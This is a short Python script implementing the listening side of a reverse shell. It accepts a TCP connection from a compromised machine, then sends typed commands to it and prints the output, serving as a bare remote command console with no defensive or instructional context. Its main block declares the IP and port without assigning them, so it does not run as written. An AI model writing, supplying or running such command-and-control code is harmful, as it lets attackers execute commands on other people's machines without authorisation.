import socket


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(4)

        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(address)}")

    def execute_remotely(self, command):
        self.connection.send(command)
        result = self.connection.recv(1024)
        result = result.decode("utf-8")
        return result

    def run(self):
        try:
            while True:
                command = str(input(">> "))
                command = command.encode("utf-8")
                result = self.execute_remotely(command)
                print(result)
        except KeyboardInterrupt:
            print("[-] Quiting")
            self.connection.close()


if __name__ == "__main__":

    ip: str
    port: int

    listener = Listener(ip, port)
    listener.run()